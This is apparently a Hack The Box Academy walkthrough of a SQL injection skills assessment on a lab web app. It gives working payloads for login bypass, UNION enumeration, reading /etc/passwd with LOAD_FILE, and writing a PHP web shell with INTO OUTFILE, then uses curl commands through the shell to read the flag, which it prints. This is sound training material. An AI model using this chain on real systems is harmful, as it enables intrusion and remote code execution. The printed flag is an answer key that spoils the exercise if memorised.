# 

---

The company `Inlanefreight` has contracted you to perform a web application assessment against one of their public-facing websites. In light of a recent breach of one of their main competitors, they are particularly concerned with SQL injection vulnerabilities and the damage the discovery and successful exploitation of this attack could do to their public image and bottom line.

They provided a target IP address and no further information about their website. Perform a full assessment of the web application from a "grey box" approach, checking for the existence of SQL injection vulnerabilities.

![InlaneFreight login page with username and password fields](https://academy.hackthebox.com/storage/modules/33/sqli_skills.png)

Find the vulnerabilities and submit a final flag using the skills we covered to complete this module. Don't forget to think outside the box!

---
## Question 1

### "Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer."

After spawning the target machine, students need to navigate to its website's root page to find a login form:

![SQL_Injection_Fundamentals_Walkthrough_Image_21.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_21.png)

Since students do not have any credentials to login with, they need to subvert the query's logic with an OR injection to land inside the "Employee Dashboard" :

Code: sql

```sql
admin' OR '1' = '1' -- -
```

![SQL_Injection_Fundamentals_Walkthrough_Image_22.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_22.png)

![SQL_Injection_Fundamentals_Walkthrough_Image_23.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_23.png)

Subsequently, students need to test whether the "SEARCH" field is vulnerable to SQL injections by providing a single apostrophe `'`, which in turns returns a SQL error message: " You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1":

![SQL_Injection_Fundamentals_Walkthrough_Image_24.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_24.png)

Now that students are assured it is vulnerable, they need to utilize `UNION` injections to attempt reading files from the backend server. Students need to detect the number of columns selected by the backend server using either the `ORDER BY` method or the `UNION` method, the latter will be utilized. Students need to test `UNION` injection queries with a different number of columns until attaining a successful results back, i.e., not getting the error message "The used SELECT statements have a different number of columns". After trail and error, students will find that there are five columns in total, with the first column not being displayed:

Code: sql

```sql
' UNION SELECT 1,2,3,4,5 -- -
```

![SQL_Injection_Fundamentals_Walkthrough_Image_25.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_25.png)

Subsequently, students now need to determine the SQL user that is running the queries in the backend server:

Code: sql

```sql
' UNION SELECT 1,user(),3,4,5 -- -
```

![SQL_Injection_Fundamentals_Walkthrough_Image_26.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_26.png)

Given that the user is `root`, it is very promising as this user is likely to be a DBA which posses many privileges. Thereafter, students need to enumerate all the privileges that the `root` user has, and whether they are granted to it or not:

Code: sql

```sql
' UNION SELECT 1, grantee, privilege_type, is_grantable, 5 FROM information_schema.user_privileges -- -
```

![SQL_Injection_Fundamentals_Walkthrough_Image_27.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_27.png)

With the `FILE` privilege granted to `root`, students can attempt to read the `/etc/passwd` file from the backend server using the `LOAD_FILE` function, injecting it in any column other than the first (the second column will be utilized):

Code: sql

```sql
' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4, 5-- -
```

![SQL_Injection_Fundamentals_Walkthrough_Image_28.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_28.png)

Subsequently, students need to make sure that the MySQL global variable `secure_file_priv` is not enabled:

Code: sql

```sql
' UNION SELECT 1, variable_name, variable_value, 4, 5 FROM information_schema.global_variables WHERE variable_name="secure_file_priv" -- -
```

![SQL_Injection_Fundamentals_Walkthrough_Image_29.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_29.png)

Since the value for the variable `SECURE_FILE_PRIV` is empty, the user `root` can read and write files to any directory in the entire file system. Therefore, students now need to write a PHP web shell `shell.php` using `INTO OUTFILE` to the directory `/var/www/html/dashboard/` (using the directory `/var/www/html/` instead will result in `Errcode: 13 "Permission Denied"`):

Code: sql

```sql
' UNION SELECT "",'<?php system($_REQUEST["cmd"]); ?>', "", "", "" INTO OUTFILE '/var/www/html/dashboard/shell.php'-- -
```

![SQL_Injection_Fundamentals_Walkthrough_Image_30.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_30.png)

With no error messages received, the web shell should be written to the backend server successfully. Therefore, students need to utilize `cURL` to invoke the web shell, passing commands to the URL parameter `cmd` (or any other parameter name chosen). First, students need to list all the files that are in the root directory `/` (deleting the first two lines, as they are unwanted), making sure to use `+` for the space character:

Code: shell

```shell
curl -w "\n" -s http://STMIP:STMPO/dashboard/shell.php?cmd=ls+/ | sed -e '1,2d'
```

  Skills Assessment - SQL Injection Fundamentals

```shell-session
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-ubuyae6zow]─[~]
└──╼ [★]$ curl -w "\n" -s http://159.65.63.151:31872/dashboard/shell.php?cmd=ls+/ | sed -e '1,2d'
	bin
boot
dev
etc
flag_cae1dadcd174.txt
home
lib
<SNIP>
```

From the output, students will know that the file is named `flag_cae1dadcd174.txt` and is under the root directory, thus, they need to print its contents out with `cat`, making sure to use `+` for the space character:

Code: shell

```shell
curl -w "\n" -s http://STMIP:STMPO/dashboard/shell.php?cmd=cat+/flag_cae1dadcd174.txt | sed -e '1,2d'
```

  Skills Assessment - SQL Injection Fundamentals

```shell-session
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-ubuyae6zow]─[~]
└──╼ [★]$ curl -w "\n" -s http://159.65.63.151:31872/dashboard/shell.php?cmd=cat+/flag_cae1dadcd174.txt | sed -e '1,2d'

	528d6d9cedc2c7aab146ef226e918396
```

Answer: {hidden}